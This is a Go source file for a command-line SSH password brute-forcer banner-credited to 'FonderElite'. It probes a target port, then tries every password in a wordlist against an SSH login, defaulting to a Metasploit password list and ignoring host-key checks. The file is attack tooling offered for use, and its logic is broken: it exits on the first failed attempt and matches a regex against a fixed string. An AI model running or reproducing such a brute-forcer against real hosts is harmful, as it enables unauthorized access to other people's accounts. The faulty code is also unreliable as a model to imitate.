package main
/*Source: 
https://gist.github.com/andrielfn/7aa336f9b6dc9e2a5dac
https://skarlso.github.io/2019/02/17/go-ssh-with-host-key-verification/
https://gist.github.com/montanaflynn/b59c058ce2adc18f31d6
https://zetcode.com/golang/readfile/
*/
import (
  "fmt"
  "flag"
  "log"
  "time"
  "net"
  "regexp"
  "os"
  "bufio"
  "golang.org/x/crypto/ssh"

)
type Verify struct{
address string
port int
name string
pass_file string
}

func Banner(){
  time.Sleep(1)
  banner_print := `
  @@@@@@  @@@@@@ @@@  @@@          @@@@@@@  @@@@@@@  @@@  @@@ @@@@@@@ @@@@@@@@
 !@@     !@@     @@!  @@@          @@!  @@@ @@!  @@@ @@!  @@@   @@!   @@!     
  !@@!!   !@@!!  @!@!@!@! @!@!@!@! @!@!@!@  @!@!!@!  @!@  !@!   @!!   @!!!:!  
     !:!     !:! !!:  !!!          !!:  !!! !!: :!!  !!:  !!!   !!:   !!:     
 ::.: :  ::.: :   :   : :          :: : ::   :   : :  :.:: :     :    : :: :::
_______________________________________________________________________________

        Made By FonderElite | Github:https://github.com/FonderElite
-------------------------------------------------------------------------------
`

fmt.Println(banner_print)
time.Sleep(2)
}
func Check (host string,portnum int) *Verify{
  check_values := Verify{address: host,port: portnum}
  target := fmt.Sprintf("%s:%d", check_values.address, check_values.port)
  conn,err :=  net.DialTimeout("tcp",target,2 * time.Second)
//  derefer := &conn
  //&{{0xc00010c080}}
  r,_ := regexp.Compile("([&])?.*([0-9])(}})")
  var matchString bool = r.MatchString("&{{0x}}")
  if err != nil{
log.Fatal(err)
os.Exit(1)

}else if matchString == true{
  fmt.Println(conn)
}else{
fmt.Printf("Success %v:%v is up! \n",check_values.address,check_values.port)
//fmt.Println(conn)
defer fmt.Printf("Time: %v\n",time.Now())
  }
                return &check_values
        }

    func BruteForce(sshuser string, wordlist string, victim string, port int) *Verify{
      brute := Verify{address: victim, port: port, name: sshuser, pass_file: wordlist}
      brute_target := fmt.Sprintf("%s:%v",brute.address,brute.port)
      passwords,err := os.Open(brute.pass_file)
      if err != nil{
log.Fatal(err)
      }
      defer passwords.Close()
      readlines := bufio.NewScanner(passwords)
      readlines.Split(bufio.ScanLines)
      var fileTextLines []string
      for readlines.Scan(){
fileTextLines = append(fileTextLines,readlines.Text())
      }
      passwords.Close()
      for _, eachline := range fileTextLines{
    config := &ssh.ClientConfig{
        User: brute.name,
        Auth: []ssh.AuthMethod{
                ssh.Password(string(eachline)),
        },
    HostKeyCallback: ssh.InsecureIgnoreHostKey(),

}
fmt.Printf("[SSH]=> %v@%v[password:%v] \n",brute.name,brute.address,eachline)
if err := readlines.Err(); err != nil{
log.Fatal(err)
}
client, err := ssh.Dial("tcp", brute_target, config)
if err != nil {
  log.Fatal(err)
}
defer client.Close()
}
return &brute
}
func main(){
  addrFlag := flag.String("ip","127.0.0.1","Ip address")
  portFlag := flag.Int("port",22,"Port")
  userFlag := flag.String("user","ubuntu","SSH-User-name")
  passFlag := flag.String("wordlist","/usr/share/wordlists/metasploit/unix_passwords.txt","Wordlist")
  flag.Parse()
  obj := Verify{*addrFlag,*portFlag,*userFlag,*passFlag}
  var value1 = obj.address 
  var value2 = obj.port
  var value3 = obj.name
  var value4 = obj.pass_file
  Banner()
Check(value1,value2)
BruteForce(value3,value4,value1,value2)
}

